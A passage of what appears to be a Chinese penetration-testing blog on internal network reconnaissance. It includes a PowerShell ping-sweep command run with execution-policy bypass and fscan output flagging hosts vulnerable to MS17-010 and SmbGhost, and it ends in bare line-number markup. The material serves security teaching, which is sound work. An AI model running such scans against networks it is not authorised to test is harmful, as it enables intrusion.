class="hljs-comment"># 0ZJ1D1G0bqWOWuJeJIFOEKTuP3GOYw4TS63XX0R58zYUBor3nEZOXP+QsRsHDpEV</span><br><span class="hljs-comment"># +7qvtVHCjSSuJMbHJyqhKSgaOnEoAjwukaPAJRHinBRHoXpoaK+bp1wgXNlxsQyP</span><br><span class="hljs-comment"># u6j4xRJon89Ay0BEpRPw5mQMJQhCMrI2iiQC/i9yfhzXSUWW6Fkd6fp0ZGuy62ZD</span><br><span class="hljs-comment"># 2rOwjNXpDd32ASDOmTFjPQgaGLOBm0/GkxAG/AeB+ova+YJJ92JuoVP6EpQYhS6S</span><br><span class="hljs-comment"># kepobEQysmah5xikmmRR7zGCAigwggIkAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUw</span><br><span class="hljs-comment"># EwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20x</span><br><span class="hljs-comment"># MTAvBgNVBAMTKERpZ2lDZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcg</span><br><span class="hljs-comment"># Q0ECEALqUCMY8xpTBaBPvax53DkwCQYFKw4DAhoFAKB4MBgGCisGAQQBgjcCAQwx</span><br><span class="hljs-comment"># CjAIoAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGC</span><br><span class="hljs-comment"># NwIBCzEOMAwGCisGAQQBgjcCARUwIwYJKoZIhvcNAQkEMRYEFGGdjjPAicJNVNbF</span><br><span class="hljs-comment"># +Rz5j79kKh51MA0GCSqGSIb3DQEBAQUABIIBAHRy5Qa+5mmePnP9ZpS8YCsexj+6</span><br><span class="hljs-comment"># OvA2XD4lNpQEsvuW68ECTEpwUXCPSKIimKompsdKdNJ147fjvRPl1FTkC7G1XCn2</span><br><span class="hljs-comment"># qymNxFpUabdiKpyQL042k4o8Naa8CfQLsnlaG2boew6Jay9w8dlXGmuVG3CDtD5r</span><br><span class="hljs-comment"># mId6oTEZjauK3vU5+eUfDIMO6U7MaTF0C3ItmGyvfOENSnWTCSWoeRUSqHc8v/np</span><br><span class="hljs-comment"># 2qay6qvKFX8F5yMG4K5WGYFL5q37FKiMdsXiG3hj3xRYmr3g+yWoZm6AVBGGDOBk</span><br><span class="hljs-comment"># 62IpemyM98KuozkzTxUtvzbucaVnpu+l0z4yrGbqIVBNxe+gu7QchKrjDVc=</span><br><span class="hljs-comment"># SIG # End signature block</span><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;<br></code></pre></td></tr></table></figure><h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h3><p><a href="https://github.com/shadow1ng/fscan">fscan</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">fscan.exe -h 192.168.7.1-255 -p 22,445<br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;<br>\____/     |___/\___|_|  \__,_|\___|_|\_\<br>                     fscan version: 1.5.1<br>scan start<br>(icmp) Target &#x27;192.168.7.7&#x27; is alive<br>(icmp) Target &#x27;192.168.7.110&#x27; is alive<br>(icmp) Target &#x27;192.168.7.107&#x27; is alive<br>icmp alive hosts len is: 3<br>192.168.7.110:445 open<br>192.168.7.7:445 open<br>192.168.7.107:445 open<br>192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable<br>192.168.7.110  (Windows 10 Pro 18363)<br>[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)<br>[+] 192.168.7.107       MS17-010        (Windows 7 Professional 7601 Service Pack 1)<br>scan end<br></code></pre></td></tr></table></figure><p>netdiscover,snscan,nmap,msf 山不在高…</p><h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><ul><li>端口 banner 信息</li><li>端口上运行的服务</li><li>常见应用的默认端口</li></ul><h3 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span 